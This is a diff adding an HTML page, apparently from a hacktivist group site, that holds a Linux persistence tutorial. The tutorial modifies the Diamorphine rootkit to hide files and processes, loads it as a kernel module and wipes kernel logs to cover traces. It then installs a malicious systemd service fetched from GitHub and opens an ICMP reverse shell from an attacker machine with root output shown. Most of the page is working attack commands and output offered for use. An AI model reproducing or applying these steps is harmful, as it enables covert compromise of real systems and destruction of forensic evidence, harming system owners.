@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="pt">
+    <style>
+    .ascii {
+        color: black;
+        padding: 30px;
+        text-align: center;
+        background-image: url('../../asciiart.png');
+        background-repeat: no-repeat;
+        background-position: center;
+        background-color: black;
+    }
+
+    .nav {
+        overflow: hidden;
+        background-color: rgb(5, 5, 5);
+    }
+    
+    .nav a {
+        float: left;
+        display: block;
+        color: white;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-family: monospace;
+    }
+    
+    .nav a:hover {
+        background-color: rgb(160, 13, 197);
+        color: white;
+    }
+
+    .card {
+    color: #000;
+    background-color: #aaa;
+    padding: 20px;
+    margin-top: 20px;
+    }
+    </style>
+    <title>Paper: Persistence Combo For Linux - Amolo Hunters</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=1024">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <body style="background-color:black;">
+        <div class="nav">
+            <a href="../../index.html">Home</a>
+            <a href="../../papers/">Papers</a>
+            <a href="../../hacktivism/">Hacktivism</a>
+            <a href="../../members/">Members</a>
+        </div>
+        <div class="ascii">
+            <h1 style="color:black;" align="right">.</h1>
+            <h1 style="color:black;" align="right">.</h1>
+        </div>
+        <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Persistence Combo For Linux</h1>
+        <p style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Author: @matheuzsec</p>
+        <div>
+                <pre style="color:white;">    [ Persistence Combo For Linux ]
+
+    _* SystemD malicious service + icmp backdoor + diamorphine rootkit with some things modified *_
+    
+    
+                      ,____
+                      |---.\
+              ___     |    `	              __.....__
+             / .-\  ./=	                    .'         ':,
+            |  |"|_/\/|                    /  __  _  __  \\
+            ;  |-;| /_|                    | |_)) || |_))||
+           / \_| |/ \ |                    | | \\ || |   ||       
+          /      \/\( |                    |             ||   _,
+          |   /  |` ) |		           |  Sysadmin   ||.-(_{}
+          /   \ _/    |	                   |   DEAD      |/    `
+         /--._/  \    |		         \\|       {}_)-,||
+         `/|)    |    /		         \\;/,,;;;;;;;,\\|//,
+           /     |   |		        .;;;;;;;;;;;;;;;;,
+         .'      |   |		       \,;;;;;;;;;;;;;;;;,//
+        /         \  |		      \\;;;;;;;;;;;;;;;;,//
+       (_.-.__.__./  /		     ,\';;;;;;;;;;;;;;;;'
+    
+    
+    
+    ************************     SUMARY    *********************************			
+    * 1 - Overview							                               *		
+    * 2 - modifying some things in diamorphine.h 		                   *
+    * 3 - Setup SystemD malicious with icmp backdoor and running	       *		.-~-.-~-.-~ Paper by MatheuZ	  	
+    * 4 - closing and thanks				                               *			
+    * 5 - Hack all the things!					                           *		
+    ************************************************************************	
+    
+    [$] CHAPTER 1 
+        
+    >>------> Overview
+    
+    In this paper I'm going to show and teach a very attractive combo, so basically we're going to use a modified version
+    of my script (https://raw.githubusercontent.com/MatheuZSecurity/systemd-backdoor/main/systemd.sh) that I made to
+    automate the systemd backdoor. We will use this modified version to load a malicious service, i.e. a systemd
+    persistence with icmp backdoor, in combination with the diamorphine rootkit with a few things changed, you can use
+    another rootkit, but I'm using diamorphine just for example.
+    
+    In the diamorphine rootkit, we're just going to change her sigkill. The sigkill to return the processes is 63, and we
+    can change it to 62 for example, thus making it difficult for the sysadmin, or anyone else to make their processes
+    reappear.
+    
+    In addition to changing the sigkill of the process, we can also change the "magic_prefix", the module name, sigkill
+    to become "invisible", sigkill to become root, and sigkill to make all hidden processes reappear.
+    
+    And making these changes to the diamorphine rootkit settings, using icmp backdoor in a kind of systemd malicious
+    service, you get an extremely good combination.
+    
+    NOTE: The malicious service will restart every 5 seconds, the purpose of this is to demonstrate that using systemd
+    to create malicious services and using rootkits can be very useful when you are going to maintain persistence.
+    
+    [$] CHAPTER 2
+    
+    First we will have to download diamorphine rootkit which is available on m0nad's github (btw thank you m0nad for
+    creating this amazing rootkit which opened doors for many people to study about rootkits).
+    
+    root@phantom:~/paper# git clone https://github.com/m0nad/Diamorphine
+    Cloning into 'Diamorphine'...
+    remote: Enumerating objects: 141, done.
+    remote: Counting objects: 100% (65/65), done.
+    remote: Compressing objects: 100% (23/23), done.
+    remote: Total 141 (delta 53), reused 42 (delta 42), pack-reused 76
+    Receiving objects: 100% (141/141), 32.26 KiB | 5.38 MiB/s, done.
+    Resolving deltas: 100% (77/77), done.
+    root@phantom:~/paper# 
+    
+    now that we've downloaded diamorphine, let's move the following files: diamorphine.c to rk.c and diamorphine.h
+    to rk.h.
+    
+    root@phantom:~/paper/Diamorphine# mv diamorphine.c rk.c
+    root@phantom:~/paper/Diamorphine# mv diamorphine.h rk.h
+    root@phantom:~/paper/Diamorphine# 
+    
+    Well, now that we've renamed the files, we can make some changes to rk.h.
+    
+    #define MAGIC_PREFIX "undetect4ble"
+    
+    #define PF_INVISIBLE 0x10000000
+    
+    #define MODULE_NAME "rk"
+    
+    enum {
+            SIGINVIS = 33,
+            SIGSUPER = 64,
+            SIGMODINVIS = 62,
+    };
+    
+    summarizing what i changed, i changed the "MAGIC_PREFIX" to "undetect4ble" i.e. when we create a folder named
+    "undetect4ble_dir", this folder becomes invisible and you cannot see it using ls, dir and any program that
+    returns all entries from a directory.
+    
+    I also changed the module name to rk.
+    
+    and finally the so famous sigkills, in diamorphine there are 3 sigkills which is one of its features.
+    
+    1 - sigkill 31 which is for you to hide some process
+    2 - sigkill 64 0 which is for you to become root
+    3 - sigkill 63 0 brings back the "module" that was hidden when we loaded diamorphine, and with the module
+    visible you can remove it using rmmod
+    
+    We also need to change in rk.c the "#include diamorphine.h" to "#include rk.h".
+    
+    And finally edit the "Makefile". Change diamorphine.o to rk.o.
+    
+    obj-m := rk.o
+    CC = gcc -Wall 
+    KDIR := /lib/modules/$(shell uname -r)/build
+    PWD := $(shell pwd)
+    
+    all:
+            $(MAKE) -C $(KDIR) M=$(PWD) modules
+    
+    clean:
+            $(MAKE) -C $(KDIR) M=$(PWD) clean
+    
+    
+    Now just compile and load the module.
+    
+    root@phantom:~/paper/Diamorphine# ls rk* M*
+    Makefile  rk.c  rk.h
+    root@phantom:~/paper/Diamorphine# make
+    make -C /lib/modules/5.15.0-56-generic/build M=/root/paper/Diamorphine modules
+    make[1]: Entering directory '/usr/src/linux-headers-5.15.0-56-generic'
+        CC [M]  /root/paper/Diamorphine/rk.o
+        MODPOST /root/paper/Diamorphine/Module.symvers
+        CC [M]  /root/paper/Diamorphine/rk.mod.o
+        LD [M]  /root/paper/Diamorphine/rk.ko
+        BTF [M] /root/paper/Diamorphine/rk.ko
+    Skipping BTF generation for /root/paper/Diamorphine/rk.ko due to unavailability of vmlinux
+    make[1]: Leaving directory '/usr/src/linux-headers-5.15.0-56-generic'
+    root@phantom:~/paper/Diamorphine# 
+    root@phantom:~/paper/Diamorphine# insmod rk.ko
+    root@phantom:~/paper/Diamorphine# 
+    
+    Now we could see that our module was loaded successfully.
+    
+    root@phantom:~/paper/Diamorphine# dmesg
+    [ 1822.281956] rk: module is already loaded
+    root@phantom:~/paper/Diamorphine#
+    root@phantom:~/paper/Diamorphine# cat /var/log/kern.log | grep "rk: module"
+    Dec 26 14:04:18 phantom kernel: [ 1822.281956] rk: module is already loaded
+    root@phantom:~/paper/Diamorphine# 
+    
+    It is always important that you clean the kern.log and dmesg logs.
+    
+    root@phantom:~/paper/Diamorphine# dmesg --clear
+    root@phantom:~/paper/Diamorphine# cat /dev/null > /var/log/kern.log
+    
+    The rootkit is already prepared and loaded for use.
+    
+    [$] CHAPTER 3
+    
+    Now that we've loaded the rootkit, we need to configure the malicious systemd that will load the "client
+    "that we're going to use to connect to the machine through the "server".
+    
+    For this, we will use an alternative version of my script by @ferreiraklet
+        
+    >>------>  https://raw.githubusercontent.com/ferreiraklet/persistence/main/persistence.sh -> source
+    
+    
+    OBS: as we modified some things in the rootkit, we will need to change the sigkill 31 that is in the
+    script to 33.
+    
+    root@phantom:~# wget https://raw.githubusercontent.com/ferreiraklet/persistence/main/persistence.sh && chmod +x persistence.sh
+    --2023-01-05 16:52:51--  https://raw.githubusercontent.com/ferreiraklet/persistence/main/persistence.sh
+    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 29926 (29K) [text/plain]
+    Saving to: ‘persistence.sh’
+    
+    persistence.sh          100%[================================================================>]  29,22K  --.-KB/s    in 0,003s  
+    
+    2023-01-05 16:52:51 (10,2 MB/s) - ‘persistence.sh’ saved [29926/29926]
+    
+    root@phantom:~# sed -i 's/kill -31 {}/kill -33 {}/g'  persistence.sh 
+    root@phantom:~# 
+    
+    Now that we've changed the sigkill from 31 to 33, we can run the script.
+    
+    root@phantom:~# systemctl status persistence
+    ● persistence.service - Systemd Persistence
+            Loaded: loaded (/etc/systemd/system/persistence.service; enabled; preset: enabled)
+            Active: active (running) since Thu 2023-01-05 21:24:22 UTC; 1s ago
+        Main PID: 2458 (bash)
+            Tasks: 5 (limit: 4547)
+            Memory: 1.1M
+            CPU: 24ms
+            CGroup: /system.slice/persistence.service
+                    ├─2458 /bin/bash -c "echo f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAABIAAAAAAABAAAAAAAAAALhBAAAAAAAAAAAAAEAAOAALAEAAHgAAA>
+                    ├─2462 ./client
+                    ├─2463 sleep 3
+                    └─2464 /bin/sh
+                    
+    root@phantom:~# 
+    
+    Notice that our malicious service is already running, so now just connect using "server" and gg, systemd persistence with icmp
+    backdoor and a rootkit with some changed things working perfectly.
+    
+    Now on the attacker's machine.
+    
+    root@mtzbox:~# git clone https://github.com/ferreiraklet/icmp_reverse_shell
+    Cloning into 'icmp_reverse_shell'...
+    remote: Enumerating objects: 66, done.
+    remote: Counting objects: 100% (66/66), done.
+    remote: Compressing objects: 100% (58/58), done.
+    remote: Total 66 (delta 31), reused 13 (delta 6), pack-reused 0
+    Receiving objects: 100% (66/66), 21.76 KiB | 1.81 MiB/s, done.
+    Resolving deltas: 100% (31/31), done.
+    root@phantom:~# cd icmp_reverse_shell/
+    root@phantom:~/icmp_reverse_shell# make
+    cc client.c -o client -pthread
+    cc server.c -o server -pthread
+    root@phantom:~/icmp_reverse_shell# ls
+    buffer.h  client  client.c  icmp_shell.h  LICENSE  Makefile  README.md  server  server.c
+    root@mtzbox:~/icmp_reverse_shell# 
+    
+    
+    
+    root@mtzbox:~/icmp_reverse_shell# ./server $IP (Here you will put the ip of the target machine to be able to connect)
+    cmd #
+    id
+    uid=0(root) gid=0(root) groups=0(root)
+    pwd
+    /root
+    echo "gg"
+    gg
+    ^C
+    root@mtzbox:~/icmp_reverse_shell# 
+    
+    [$] CHAPTER 4
+    
+    >>-;;;------;;--> Thank you for reading the paper, I hope you like it, if anyone has any questions you can contact me on discord:
+    MatheuZ#8923. 
+    
+    [$] CHAPTER 5 - End
+    
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠿⢿⣿⣷⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣷⣠⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⡄⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣟⠉⢹⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⣰⣿⣿⡟⠁⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⢿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⣴⣾⣿⣿⣿⣿⣶⡀⢀⣾⣿⣿⠋⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠹⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⢸⣿⡁⠀⠀⢀⣿⣿⢇⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⡈⠙⢿⣿⣿⣿⠿⠋⢩⡇⠀⠀⠀⠀⠀⠀⠙⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠈⠛⠛⣠⣴⣿⡿⠋⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⣶⣾⣿⣿⣿⣷⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⣠⣾⣿⡿⠋⠀⠀⢻⣿⣿⣷⡀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⢠⣿⣿⣏⣠⣤⣶⣤⠀⠀⠀⠀- Hack All The Things
+    ⢰⣿⣿⣟⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣴⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀
+    ⢸⣿⣿⣿⣦⣄⣀⠀⠀⠀⠉⠙⠛⠛⢿⣿⣿⣿⣿⣿⣿ MATHEUZ ⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⢿⣿⣶⣄⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⠛⠛⠛⣿⣿⣿⣿⠟⢋⣿⣿⣿⡿⠋⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠙⢿⣿⣧⡀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠟⠁⠀⣿⣿⣿⠟⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠈⢿⣿⣷⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠏⠀⠀⢸⣿⣿⣿⠀⠀⠀⢸⣿⣿⣿⠀⠈⢻⣿⣿⣿⢿⣿⣿⣦⡀⠀⠀⠀⣸⣿⣿⠀⣀⡄
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡟⠀⠀⠀⠸⣿⣿⣿⠀⠀⠀⢻⣿⣿⣿⠀⠀⠀⢻⣿⣿⡆⠹⢿⣿⣿⣶⣶⣾⣿⣿⣿⣿⠋⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀⢿⣿⣿⡆⠀⠀⠸⣿⣿⣿⡄⠀⠀⠀⢿⣿⣿⠀⠀⠙⠛⠿⠿⠿⠛⠋⢸⣿⠀⠀
+    ⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠘⣿⣿⣿⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀
+    ⠀⠀⠀⢠⣶⣿⣿⠿⠋⠁⠒⠛⢻⣷⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⣠⣿⣿⣿⢃⣴⣿⠟⠛⢿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢠⣿⣿⠀⠀
+    ⠀⠀⢰⣿⣿⠟⠁⠀⠀⠀⠀⢀⣾⡟⠀⠀⠀⠀⠀⠘⣿⣿⣧⣾⣿⣿⠟⠁⣾⣿⡇⠀⠀⠘⢿⣿⣿⣦⡀⠀⠀⣀⣴⣿⣿⠃⠀⠀
+    ⠀⠀⣿⣿⡇⠀⠀⢀⡄⠀⢠⣿⣿⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⠟⠁⠀⠀⢿⣿⣇⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀
+    ⠀⠀⠹⣿⣷⣄⣀⣼⡇⠀⢸⣿⣿⡀⠀⠀⠀⠀⣠⣿⣿⣿⡿⠋⠀⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠈⠛⠛⠛⠋⠀⠀⠀⢻⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠛⠛⠉⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣷⣄⣀⠀⢀⣀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                    
+                </pre>                    
+        </div>
+    </body>
+</html>
